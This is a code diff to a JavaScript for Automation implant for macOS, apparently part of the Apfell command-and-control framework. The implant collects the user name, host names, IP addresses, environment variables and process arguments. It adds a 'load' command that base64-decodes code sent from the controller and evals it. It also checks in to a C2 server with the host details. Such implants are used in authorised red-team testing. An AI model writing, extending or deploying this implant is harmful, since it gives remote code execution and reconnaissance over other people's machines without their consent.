@@ -9,20 +9,20 @@ class implant{
 		this.procInfo = $.NSProcessInfo.processInfo;
 		this.hostInfo = $.NSHost.currentHost;
 		this.id = -1;
-		this.user = ObjC.unwrap(this.procInfo.userName);
-		this.fullName = ObjC.unwrap(this.procInfo.fullUserName);
+		this.user = ObjC.deepUnwrap(this.procInfo.userName);
+		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
 		//every element in the array needs to be unwrapped
-		this.ip = ObjC.unwrap(this.hostInfo.addresses); //probably just need [0]
+		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses); //probably just need [0]
 		this.pid = this.procInfo.processIdentifier;
 		//every element in the array needs to be unwrapped
-		this.host = ObjC.unwrap(this.hostInfo.names); //probably just need [0]
+		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
 		this.killdate = "";
 		//this is a dictionary, but every 'value' needs to be unwrapped
-		this.environment = ObjC.unwrap(this.procInfo.environment);
+		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
 		this.uptime = this.procInfo.systemUptime;
 		//every element in the array needs to be unwrapped
-		this.args = ObjC.unwrap(this.procInfo.arguments);
-		this.osVersion = this.procInfo.operatingSystemVersionString;
+		this.args = ObjC.deepUnwrap(this.procInfo.arguments);
+		this.osVersion = this.procInfo.operatingSystemVersionString.js;
 		this.uuid = "XXXX";
 	}
 }
@@ -95,7 +95,6 @@ default_load = function(contents){
     var module = {exports: {}};
     var exports = module.exports;
     if(typeof contents == "string"){
-        console.log("about to eval the command string");
         eval(contents);
     }
     else{
@@ -124,6 +123,26 @@ base64_encode = function(data){
     return encoded;
 };
     var commands_string = `
+        exports.exit = function(task, command, params){
+        $.NSApplication.sharedApplication.terminate(this);
+        };
+        exports.load = function(task, command, params){
+            //base64 decode the params and pass it to the default_load command
+            //  params should be {"cmd": "cmd_name", "code": "base64 encoded JXA code"}
+            try{
+                params = params.replace(/\\'/g, "\\"");
+                parsed_params = JSON.parse(params);
+                new_dict = default_load(base64_decode(parsed_params['code']));
+                commands_dict = Object.assign({}, commands_dict, new_dict);
+                return "Loaded " + parsed_params['cmd'];
+            }
+            catch(error){
+                return error.toString();
+            }
+
+        };
+    `;
+    commands_string = commands_string + `
 //-------------COMMAND DECLARATIONS AND IMPLEMENTATIONS -----------------------
 `;
     //console.log("about to load commands");
@@ -132,10 +151,10 @@ base64_encode = function(data){
 //-------------GET IP AND CHECKIN ----------------------------------
 for(var i=0; i < apfell.ip.length; i++){
 	ip = apfell.ip[i];
-	if (ip.js.includes(".") && ip.js != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
+	if (ip.includes(".") && ip != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
 		//console.log("found ip, checking in");
 		C2.setConfig({"commands": Object.keys(commands_dict)});
-		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
+		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
 		break;
 	}
 }
